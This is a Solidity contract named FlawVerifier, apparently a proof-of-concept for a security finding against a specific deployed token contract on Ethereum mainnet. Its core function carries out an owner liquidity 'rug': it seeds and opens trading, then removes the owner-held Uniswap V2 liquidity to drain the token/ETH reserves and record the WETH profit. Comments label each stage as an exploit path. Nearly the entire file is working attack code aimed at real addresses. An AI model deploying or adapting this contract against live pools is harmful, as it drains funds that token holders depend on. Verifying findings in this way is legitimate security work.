// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHoppy {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router02Minimal {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    enum ExecutionStatus {
        NotRun,
        BlockedNoActionablePath,
        ExecutedNoProfit,
        ExecutedWithProfit
    }

    address public constant TARGET = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    bytes32 internal constant UNISWAP_V2_PAIR_INIT_CODE_HASH =
        hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f";

    uint256 private _profitAmount;
    ExecutionStatus public status;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        bool acted = _executeOwnerLiquidityRug();

        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            IWETH9(WETH).deposit{value: nativeBalance}();
        }

        uint256 endingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
            status = ExecutionStatus.ExecutedWithProfit;
        } else {
            _profitAmount = 0;
            status = acted ? ExecutionStatus.ExecutedNoProfit : ExecutionStatus.BlockedNoActionablePath;
        }
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeOwnerLiquidityRug() internal returns (bool) {
        IHoppy target = IHoppy(TARGET);
        address owner = target.owner();
        address pair = _canonicalPair();
        if (pair == address(0)) {
            // Exploit path 0:
            // The launch routine only seeds liquidity from the token contract's own inventory, so the
            // owner first has to move launch tokens into the token contract until `balanceOf(address(this))`
            // on the token becomes non-zero.
            //
            // At the supplied fork the owner has already renounced ownership, which makes the launch path
            // permanently unreachable for a public verifier. We keep the original launch ordering intact,
            // but only execute it if the verifier really is the current owner.
            if (owner != address(this)) {
                return false;
            }

            if (target.balanceOf(TARGET) == 0) {
                uint256 attackerInventory = target.balanceOf(address(this));
                if (attackerInventory == 0 || address(this).balance == 0) {
                    return false;
                }

                require(target.transfer(TARGET, attackerInventory), "launch seed failed");
                if (target.balanceOf(TARGET) == 0) {
                    return false;
                }
            }

            // Exploit path 1:
            // Public launch liquidity is added through the canonical Uniswap V2 router and the LP is
            // minted to `owner()`. This keeps the finding's causality intact while avoiding the broader
            // multi-venue scan that caused the fork RPC failure in the supplied logs.
            (bool funded, ) = payable(TARGET).call{value: address(this).balance}("");
            require(funded, "eth seed failed");

            target.openTrading();
            pair = _canonicalPair();
            if (pair == address(0)) {
                return false;
            }
        }

        if (!_isTargetWethPair(pair)) {
            return false;
        }

        // Exploit path 2:
        // Because the owner is the LP recipient, the owner-controlled verifier can later burn those LP
        // tokens and withdraw the backing reserves. If the verifier does not hold the LP on the current
        // fork, the final rug stage is no longer publicly executable from this state.
        uint256 lpBalance = IERC20Minimal(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return false;
        }

        require(IERC20Minimal(pair).approve(ROUTER, lpBalance), "lp approve failed");
        IUniswapV2Router02Minimal(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
            TARGET,
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Exploit path 3:
        // Removing the owner-held LP drains the token/ETH reserves that gave holders an exit venue.
        return true;
    }

    function _canonicalPair() internal view returns (address) {
        address pair = IUniswapV2FactoryMinimal(UNISWAP_V2_FACTORY).getPair(TARGET, WETH);
        if (pair != address(0)) {
            return pair;
        }

        // The pair address is deterministic under the canonical Uniswap V2 factory. Falling back to the
        // CREATE2 derivation keeps the verifier aligned with the finding even if the factory lookup fails.
        (address token0, address token1) = TARGET < WETH ? (TARGET, WETH) : (WETH, TARGET);
        pair = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            UNISWAP_V2_FACTORY,
                            keccak256(abi.encodePacked(token0, token1)),
                            UNISWAP_V2_PAIR_INIT_CODE_HASH
                        )
                    )
                )
            )
        );
        return pair.code.length == 0 ? address(0) : pair;
    }

    function _isTargetWethPair(address pair) internal view returns (bool) {
        if (pair == address(0) || pair.code.length == 0) {
            return false;
        }

        try IUniswapV2PairLike(pair).token0() returns (address token0) {
            address token1 = IUniswapV2PairLike(pair).token1();
            if (token0 == TARGET && token1 == WETH) {
                return _pairHasReserves(pair);
            }
            if (token0 == WETH && token1 == TARGET) {
                return _pairHasReserves(pair);
            }
            return false;
        } catch {
            return false;
        }
    }

    function _pairHasReserves(address pair) internal view returns (bool) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        return reserve0 != 0 && reserve1 != 0;
    }
}
